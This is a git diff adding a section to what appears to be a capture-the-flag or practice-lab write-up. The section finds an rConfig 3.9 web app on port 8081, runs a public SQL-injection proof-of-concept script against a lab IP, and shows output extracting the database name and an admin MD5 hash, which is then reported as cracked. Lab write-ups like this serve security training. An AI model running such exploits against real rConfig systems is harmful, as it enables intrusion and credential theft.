@@ -80,5 +80,34 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 a web server running on port `8081`, opening it on a browser, we got redirected to a login page. And we can see the web app is running `rconfig` service.
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/cf554c2d-771c-42ce-bb0e-e297665eeafc)
+
+did some research and found out exploits for the `rconfig` service. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/QuakerJack]
+└─$ python sqli.py https://192.168.185.57:8081
+rconfig 3.9 - SQL Injection PoC
+[+] Triggering the payloads on https://192.168.185.57:8081/commands.inc.php
+[+] Extracting the current DB name :
+rconfig
+[+] Extracting 10 first users :
+admin:1:dc40b85276a1f4d7cb35f154236aa1b2
+Maybe no more information ?
+Maybe no more information ?
+Maybe no more information ?
+Maybe no more information ?
+[+] Extracting 10 first devices :
+Maybe no more information ?
+Maybe no more information ?
+[*Snip*]
+Maybe no more information ?
+Done
+```
+ran the sqli exploit, we are able to extract the admin password md5 hash 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/50ffafc2-ba47-4eec-a994-0d9085378ec5)
+
+cracked the password hash `abgrtyu`. 
 
 
